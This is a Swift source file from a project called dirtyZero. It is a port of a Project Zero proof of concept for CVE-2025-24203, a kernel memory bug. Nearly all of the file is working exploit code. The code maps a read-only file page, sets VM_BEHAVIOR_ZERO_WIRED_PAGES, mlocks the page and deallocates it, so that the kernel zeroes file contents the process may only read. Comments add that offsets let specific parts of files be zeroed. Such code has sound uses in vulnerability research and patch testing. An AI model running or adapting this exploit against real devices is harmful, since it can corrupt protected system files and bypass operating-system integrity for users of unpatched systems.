//
//  unwire_mlock_poc.swift
//  dirtyZero
//
//  Created by Skadz on 5/11/25.
//

//  Full Swift port of unwire_mlock_poc.c and zero_file_page.c from https://project-zero.issues.chromium.org/issues/391518636.
//  CVE-2025-24203 discovered by Ian Beer of Google Project Zero.

import Foundation
import Darwin

let pageSize = sysconf(_SC_PAGESIZE)

// okay so, turns out it IS (sort of) possible to zero out specific parts of files.
// just give mmap an offset and zero that page.
// haven't been able to do any experimenting with this, leaving this code here if anyone else wants to do anything.
func mapFilePage(path: String, offset: Int) throws -> UnsafeMutableRawPointer {
    let fd = open(path, O_RDONLY)
    
    guard fd != -1 else {
      throw "open failed. this either means that the exploit isn't supported or the file simply doesn't exist."
    }
    
    let mappedAt = mmap(nil, pageSize, PROT_READ, MAP_FILE | MAP_SHARED, fd, off_t(offset))
    
    guard mappedAt != MAP_FAILED else {
        close(fd)
        throw "mmap failed"
    }
    
    return mappedAt!
}

func zeroAtPath(path: String, offset: Int? = nil) throws {
    let fileOffset = offset ?? 0
    
    guard fileOffset % pageSize == 0 else {
        throw "offset must be a multiple of \(pageSize)"
    }
    
    let page = try mapFilePage(path: path, offset: fileOffset)
    print(String(format: "(wr) mapped page at offset 0x%016zx at 0x%016llx", fileOffset, UInt(bitPattern: page)))
    
    let pageVmAddress = UInt(bitPattern: page)
    
    var kr = vm_behavior_set(mach_task_self_, pageVmAddress, vm_size_t(pageSize), VM_BEHAVIOR_ZERO_WIRED_PAGES)
    guard kr == KERN_SUCCESS else {
        throw "failed to set VM_BEHAVIOR_ZERO_WIRED_PAGES on the entry"
    }
    
    print("(wr) set VM_BEHAVIOR_ZERO_WIRED_PAGES")
    
    let mlockErr = mlock(page, pageSize)
    guard mlockErr == 0 else {
        throw "mlock failed"
    }
    print("(wr) mlock success")
    
    kr = vm_deallocate(mach_task_self_, pageVmAddress, vm_size_t(pageSize))
    guard kr == KERN_SUCCESS else {
        throw "vm_deallocate failed: \(String(cString: mach_error_string(kr)))"
    }
    print("(wr) deleted map entries before unwiring")
    
    print("(wr) zeroed file successfully!")
}
